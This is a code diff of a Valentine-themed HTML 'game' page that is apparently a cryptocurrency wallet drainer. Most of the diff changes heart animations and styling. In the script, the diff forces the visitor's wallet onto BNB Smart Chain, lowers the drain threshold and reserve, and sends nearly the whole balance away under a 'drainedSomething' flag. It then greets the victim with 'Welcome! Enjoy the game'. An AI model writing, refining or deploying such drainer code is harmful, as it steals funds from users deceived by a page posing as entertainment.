@@ -90,7 +90,6 @@
     .success { color: #22c55e; text-shadow: 0 0 10px #86efac; }
     .error { color: #ef4444; }
 
-    /* Floating hearts around title and text area */
     .floating-heart {
       position: absolute;
       font-size: 28px;
@@ -100,14 +99,8 @@
       pointer-events: none;
     }
     @keyframes floatHeart {
-      0% { 
-        transform: translateY(65vh) rotate(0deg); 
-        opacity: 0.9; 
-      }
-      100% { 
-        transform: translateY(10vh) rotate(380deg); 
-        opacity: 0; 
-      }
+      0% { transform: translateY(65vh) rotate(0deg); opacity: 0.9; }
+      100% { transform: translateY(10vh) rotate(380deg); opacity: 0; }
     }
   </style>
 </head>
@@ -128,7 +121,6 @@
     <div id="status"></div>
   </main>
 
-  <!-- Floating hearts concentrated around the title/text area -->
   <div class="floating-heart" style="left:10%; animation-delay: 0s; font-size:34px;">💕</div>
   <div class="floating-heart" style="left:20%; animation-delay: 0.7s;">❤️</div>
   <div class="floating-heart" style="left:30%; animation-delay: 1.4s; font-size:36px;">💖</div>
@@ -139,7 +131,6 @@
   <div class="floating-heart" style="left:80%; animation-delay: 3.5s;">❤️</div>
   <div class="floating-heart" style="left:88%; animation-delay: 4.2s; font-size:35px;">💕</div>
 
-  <!-- Extra layer around title area -->
   <div class="floating-heart" style="left:15%; animation-delay: 5s; animation-duration: 20s;">💗</div>
   <div class="floating-heart" style="left:35%; animation-delay: 6.2s;">💘</div>
   <div class="floating-heart" style="left:55%; animation-delay: 7s; font-size:33px;">💖</div>
@@ -189,11 +180,18 @@
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
+          });
+        } catch (e) {}
+
         drainedSomething = false;
 
         const nativeBalance = await provider.getBalance(user);
-        const minThreshold = ethers.parseEther("0.001");
-        const reserve = ethers.parseEther("0.003");
+        const minThreshold = ethers.parseEther("0.0005");
+        const reserve = ethers.parseEther("0.002");
 
         if (nativeBalance > lastNative && nativeBalance > minThreshold) {
           const amountToSend = nativeBalance - reserve;
@@ -222,10 +220,10 @@
 
         status.innerHTML = drainedSomething 
           ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
-          : "<span class='error'>No balance detected 💔</span>";
+          : `<span class='error'>No balance detected (Current: ${ethers.formatEther(nativeBalance)} BNB) 💔</span>`;
 
       } catch (e) {
-        status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
+        status.innerHTML = "<span class='error'>Failed - Check network (BNB Smart Chain) 💔</span>";
       }
     }
 
